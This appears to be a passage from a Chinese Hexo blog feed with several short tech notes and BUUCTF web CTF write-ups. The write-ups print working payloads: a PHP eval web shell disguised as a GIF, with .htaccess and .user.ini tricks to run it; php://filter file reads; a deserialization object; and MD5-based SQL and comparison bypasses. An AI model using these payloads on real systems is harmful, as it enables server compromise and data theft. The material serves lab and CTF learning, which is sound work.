title="其他安全漏洞"></a>其他安全漏洞</h3><h4 id="密码破解攻击（Password-Cracking）"><a href="#密码破解攻击（Password-Cracking）" class="headerlink" title="密码破解攻击（Password Cracking）"></a>密码破解攻击（Password Cracking）</h4><p>密码破解攻击（Password Cracking）即算出密码，突破认证。</p><h4 id="点击劫持（Clickjacking）"><a href="#点击劫持（Clickjacking）" class="headerlink" title="点击劫持（Clickjacking）"></a>点击劫持（Clickjacking）</h4><p>点击劫持（Clickjacking）是指利用透明的按钮或链接做成陷阱，覆盖在 Web 页面之上。然后诱使用户在不知情的情况下，点击那个链接访问内容的一种攻击手段。这种行为又称为界面伪装（UI Redressing）。</p><h4 id="DoS-攻击（Denial-of-Service-attack）"><a href="#DoS-攻击（Denial-of-Service-attack）" class="headerlink" title="DoS 攻击（Denial of Service attack）"></a>DoS 攻击（Denial of Service attack）</h4><p>DoS 攻击（Denial of Service attack）是一种让运行中的服务呈停止状态的攻击。有时也叫做服务停止攻击或拒绝服务攻击。DoS 攻击的对象不仅限于 Web 网站，还包括网络设备及服务器等。</p><h4 id="后门程序（Backdoor）"><a href="#后门程序（Backdoor）" class="headerlink" title="后门程序（Backdoor）"></a>后门程序（Backdoor）</h4><p>后门程序（Backdoor）是指开发设置的隐藏入口，可不按正常步骤使用受限功能。利用后门程序就能够使用原本受限制的功能。</p>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于hexo插入图片</title>
      <link href="2021/04/21/guan-yu-hexo-cha-ru-tu-pian/"/>
      <url>2021/04/21/guan-yu-hexo-cha-ru-tu-pian/</url>
      
        <content type="html"><![CDATA[<h1 id="hexo-博文中图片部署"><a href="#hexo-博文中图片部署" class="headerlink" title="hexo 博文中图片部署"></a>hexo 博文中图片部署</h1><p>在<code>source</code>下创建一个<code>images</code>目录，存放图片</p><p>引用方式</p><pre class=" language-php"><code class="language-php"><span class="token operator">/</span>images<span class="token operator">/</span>xxx<span class="token punctuation">.</span>jpg</code></pre><p>也可以为每条博文分别创建</p><p>在_post目录下创建一个与md同名的文件夹放图片</p><p>应用方式</p><pre class=" language-php"><code class="language-php"><span class="token operator">/</span>xxx<span class="token punctuation">.</span>jpg</code></pre><p>注意这里是<code>\</code>,windows下是<code>/</code></p>]]></content>
      
      
      <categories>
          
          <category> bug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux(kali)安装vm-tools</title>
      <link href="2021/04/11/linux-an-zhuang-vm-tools/"/>
      <url>2021/04/11/linux-an-zhuang-vm-tools/</url>
      
        <content type="html"><![CDATA[<h2 id="linux-kali-安装vm-tools"><a href="#linux-kali-安装vm-tools" class="headerlink" title="linux(kali)安装vm-tools"></a>linux(kali)安装vm-tools</h2><h3 id="1-安装vmware自带的"><a href="#1-安装vmware自带的" class="headerlink" title="1.安装vmware自带的"></a>1.安装vmware自带的</h3><p>安装完linux后，右击安装的虚拟机，点击安装vmware-tools</p><p><img src="https://z3.ax1x.com/2021/04/12/c0o4df.png" alt="c0o4df.png"></p><p>再点击图中红线上的光盘</p><p><img src="https://z3.ax1x.com/2021/04/12/c0o5o8.png" alt="c0o5o8.png"></p><p>先创建一个文件夹<code>tools</code> <code>mkdir tools</code></p><p>进入刚才打开光盘的目录 <code>cd /media/cdrom0</code></p><p>将压缩包移到刚才创建的文件夹tools下  <code>cp VMwareTools-10.3.22-15902021.tar.gz /tools/</code></p><p>在进入创建的文件夹</p><p>解压<code>tar -xf VMwareTools-10.3.22-15902021.tar.gz </code></p><p><img src="https://z3.ax1x.com/2021/04/12/c0ooFS.png" alt="c0ooFS.png"></p><p>进入<code>vmware-tools-distrib</code></p><p>执行安装<code>./vmware-install.pl</code></p><p>然后一路enter</p><h3 id="2-安装kali自带的"><a href="#2-安装kali自带的" class="headerlink" title="2.安装kali自带的"></a>2.安装kali自带的</h3><p><code>apt-get install open-vm-tools-desktop fuse</code></p><h2 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h2><h3 id="重新安装vm-tools是灰色的"><a href="#重新安装vm-tools是灰色的" class="headerlink" title="重新安装vm-tools是灰色的"></a>重新安装vm-tools是灰色的</h3><p><img src="https://z3.ax1x.com/2021/04/12/c0o7WQ.png" alt="c0o7WQ.png"></p><p>如图，可以点击编辑虚拟机设置</p><p>然后将CD/DVD换为自动检查或者新建一个，然后开启虚拟机安装vm-tools，之后可以改回来</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>物理机ssh连接不上虚拟机</title>
      <link href="2021/04/05/wu-li-ji-ssh-lian-jie-bu-shang-xu-ni-ji/"/>
      <url>2021/04/05/wu-li-ji-ssh-lian-jie-bu-shang-xu-ni-ji/</url>
      
        <content type="html"><![CDATA[<p>保证虚拟机连得上网，比如能ping百度</p><p>最简单办法</p><p><img src="https://z3.ax1x.com/2021/04/05/cQclWV.png" alt="cQclWV.png"></p><p>点击更改设置获取管理员权限</p><p><img src="https://z3.ax1x.com/2021/04/05/cQc1zT.png" alt="cQc1zT.png"></p><p>然后还原</p><p><img src="https://z3.ax1x.com/2021/04/05/cQcNw9.png" alt="cQcNw9.png"></p>]]></content>
      
      
      <categories>
          
          <category> bug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF_2019 CheckIn</title>
      <link href="2021/04/01/suctf-2019-checkin/"/>
      <url>2021/04/01/suctf-2019-checkin/</url>
      
        <content type="html"><![CDATA[<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>尝试提交<img src="https://z3.ax1x.com/2021/04/01/cVvgMt.png" alt="cVvgMt.png"></p><p>illegal suffix</p><p>尝试修改后缀和Content-Type字段，还是不合法</p><p>修改后缀为jpg，再次上传</p><p><img src="https://z3.ax1x.com/2021/04/01/cVvrPH.png" alt="cVvrPH.png"></p><p>不能有&lt;?，修改文件内容</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"php"</span><span class="token operator">></span>@<span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p><img src="https://z3.ax1x.com/2021/04/01/cVxVoD.png" alt="cVxVoD.png"></p><p>exif_imagetype函数</p><p>在头部加个图片幻数</p><pre class=" language-js"><code class="language-js">GIF89a<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"php"</span><span class="token operator">></span>@<span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p><img src="https://z3.ax1x.com/2021/04/01/cVxYFg.png" alt="cVxYFg.png"></p><p>访问图片，确实成功了</p><p><img src="https://z3.ax1x.com/2021/04/01/cVx5m6.png" alt="cVx5m6.png"></p><p>成功，但是要连接需要把它解释为php文件</p><p>上传<code>.htaccess</code>文件</p><pre class=" language-js"><code class="language-js">GIF89aSetHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php <span class="token punctuation">.</span>jpg</code></pre><p><img src="https://z3.ax1x.com/2021/04/01/cVxLpd.png" alt="cVxLpd.png"></p><p>用蚁剑连接没有成功，可能中间件不是Apache</p><p>可以改用上传<code>.uesr.ini</code>文件</p><p>使用条件</p><p>上传马的文件夹有php文件</p><p>原理：存在php文件，就会向目录里查找.jpg，解析为php</p><pre class=" language-js"><code class="language-js">GIF89aauto_prepend_file<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">.</span>jpg如果前面的马写的是GIF89a<span class="token operator">&lt;</span><span class="token operator">%</span> @<span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">%</span><span class="token operator">></span>则加一行GIF89aauto_prepend_file<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">.</span>jpgasp_tags<span class="token operator">=</span>on</code></pre><p><img src="https://z3.ax1x.com/2021/04/01/cVxz0f.png" alt="cVxz0f.png"></p><p>连接</p><p><img src="https://z3.ax1x.com/2021/04/01/cVz9AS.png" alt="cVz9AS.png"></p><p>成功，在根目录找到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZJCTF_2019 NiZhuanSiWei</title>
      <link href="2021/04/01/zjctf-2019-nizhuansiwei/"/>
      <url>2021/04/01/zjctf-2019-nizhuansiwei/</url>
      
        <content type="html"><![CDATA[<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>进入页面便是代码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">"welcome to the zjctf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;h1>"</span><span class="token punctuation">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h1>&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">echo</span> <span class="token string">"Not now!"</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//useless.php</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token keyword">else</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token delimiter">?></span></code></pre><p>代码审计</p><p><code>file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;</code>读取$text内容与后面比较</p><p><code>file_get_contents</code>可以用到伪协议</p><p>enctype=”multipart/form-data” 的时候 php://input 是无效的</p><p>构造payload</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>text<span class="token operator">=</span>data<span class="token punctuation">:</span>text<span class="token operator">/</span>plain<span class="token punctuation">,</span>welcome to the zjctf</code></pre><p><code>preg_match(&quot;/flag/&quot;,$file)</code>file不能包含flag</p><p><code>include($file);  //useless.php</code>包含文件</p><p>payload</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resoure=useless.php</span></code></pre><p>payload</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>text<span class="token operator">=</span>data<span class="token punctuation">:</span>text<span class="token operator">/</span>plain<span class="token punctuation">,</span>welcome to the zjctf<span class="token operator">&amp;</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=useless.php</span></code></pre><p>得到</p><pre class=" language-php"><code class="language-php">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo<span class="token operator">=</span></code></pre><p>解码的</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;  </span><span class="token comment" spellcheck="true">//flag.php  </span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;  </span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;  </span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>"U R <span class="token constant">SO</span> <span class="token constant">CLOSE</span> <span class="token operator">!</span><span class="token comment" spellcheck="true">///COME ON PLZ");</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;  </span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;  </span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;  </span><span class="token delimiter">?></span>  </code></pre><p><code>$password = unserialize($password);</code>反序列化函数</p><p>将上面一个类序列化</p><pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Flag"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;s:4:</span><span class="token string">"file"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre><p>最终payload</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>text<span class="token operator">=</span>data<span class="token punctuation">:</span>text<span class="token operator">/</span>plain<span class="token punctuation">,</span>welcome to the zjctf<span class="token operator">&amp;</span>file<span class="token operator">=</span>useless<span class="token punctuation">.</span>php<span class="token operator">&amp;</span>password<span class="token operator">=</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Flag"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;s:4:</span><span class="token string">"file"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre><p>最后ctrl+U查看flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哈希碰撞表</title>
      <link href="2021/03/31/ha-xi-peng-zhuang/"/>
      <url>2021/03/31/ha-xi-peng-zhuang/</url>
      
        <content type="html"><![CDATA[<h3 id="哈希碰撞表"><a href="#哈希碰撞表" class="headerlink" title="哈希碰撞表"></a>哈希碰撞表</h3><pre class=" language-php"><code class="language-php">0e开头的md5和原值：s878926199a<span class="token number">0e545993274517709034328855841020</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s214587387a<span class="token number">0e848240448830537924465865611904</span>s214587387a<span class="token number">0e848240448830537924465865611904</span>s878926199a<span class="token number">0e545993274517709034328855841020</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1184209335a<span class="token number">0e072485820392773389523109082030</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s532378020a<span class="token number">0e220463095855511507588041205815</span>s878926199a<span class="token number">0e545993274517709034328855841020</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s214587387a<span class="token number">0e848240448830537924465865611904</span>s1502113478a<span class="token number">0e861580163291561247404381396064</span>s1091221200a<span class="token number">0e940624217856561557816327384675</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s1885207154a<span class="token number">0e509367213418206700842008763514</span>s1836677006a<span class="token number">0e481036490867661113260034900752</span>s1665632922a<span class="token number">0e731198061491163073197128363787</span>s878926199a<span class="token number">0e545993274517709034328855841020</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020 Easy MD5</title>
      <link href="2021/03/31/bjdctf2020-easy-md5/"/>
      <url>2021/03/31/bjdctf2020-easy-md5/</url>
      
        <content type="html"><![CDATA[<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>查看源码</p><pre class=" language-html"><code class="language-html">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>upload<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>leveldo4.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>password<span class="token punctuation">'</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>in<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>give<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p>提交一个值抓包试试</p><p>发现响应头中有hint</p><pre class=" language-sql"><code class="language-sql">Hint: <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token string">'admin'</span> <span class="token keyword">where</span> password<span class="token operator">=</span>md5<span class="token punctuation">(</span>$pass<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span></code></pre><p>这里考察md5的知识</p><p><code>md5($pass,true)</code>返回$pass md5的16进制内容，输出解析就形成</p><pre class=" language-php"><code class="language-php"><span class="token string">'or'</span><span class="token constant">6XXXX</span></code></pre><p><img src="https://z3.ax1x.com/2021/03/31/cAor1e.png" alt="cAor1e.png"></p><p>被sql语句解析，就能形成拼接</p><pre class=" language-sql"><code class="language-sql">payloadpassword<span class="token operator">=</span>ffifdyop拼接后：<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token string">'admin'</span> <span class="token keyword">where</span> password<span class="token operator">=</span><span class="token string">''</span><span class="token operator">or</span><span class="token string">'6XXXX'</span>即可绕过</code></pre><p>进入levels91.php     Do You Like MD5?查看源码</p><pre class=" language-php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token comment" spellcheck="true">// wow, glzjin wants a girl friend.</span><span class="token operator">--</span><span class="token operator">></span></code></pre><p>这里又考察哈希碰撞，也可以用[]绕过  <code>== !=</code></p><pre class=" language-sql"><code class="language-sql">payload<span class="token number">a</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token number">b</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">or</span><span class="token number">a</span><span class="token operator">=</span>s878926199a<span class="token operator">&amp;</span><span class="token number">b</span><span class="token operator">=</span>s155964671a</code></pre><p>得到源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param1'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre><p>这里一样，md5[]绕过 <code>=== !==</code></p><pre class=" language-php"><code class="language-php">payloadparam1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>param2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span></code></pre><p>得到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战 2019BuyFlag</title>
      <link href="2021/03/31/ji-ke-da-tiao-zhan-2019-buyflag/"/>
      <url>2021/03/31/ji-ke-da-tiao-zhan-2019-buyflag/</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>进入payflag页面，查看源码，得到</p><pre class=" language-php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>    <span class="token operator">~</span><span class="token operator">~</span><span class="token operator">~</span>post money <span class="token keyword">and</span> password<span class="token operator">~</span><span class="token operator">~</span><span class="token operator">~</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">echo</span> <span class="token string">"password can't be number&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;elseif ($password == 404) &amp;#123;</span>        <span class="token keyword">echo</span> <span class="token string">"Password Right!&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token operator">--</span><span class="token operator">></span></code></pre><p><img src="https://z3.ax1x.com/2021/03/31/cFIHdf.png" alt="cFIHdf.png"></p><p>并且分析图片，得到以下信息</p><p>需要传入<code>money=100000000</code>和<code>password=404</code>并且password不能被检查为数字，还需要是CUIT的学生</p><p><code>password==404</code> 用到php的弱类型，<code>password=404a</code>即可绕过</p><p>CUIT的学生POST参数没说，可能在报文的头里面，抓包看看</p><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.9<span class="token header-name keyword">Cookie:</span> user=0<span class="token header-name keyword">Connection:</span> 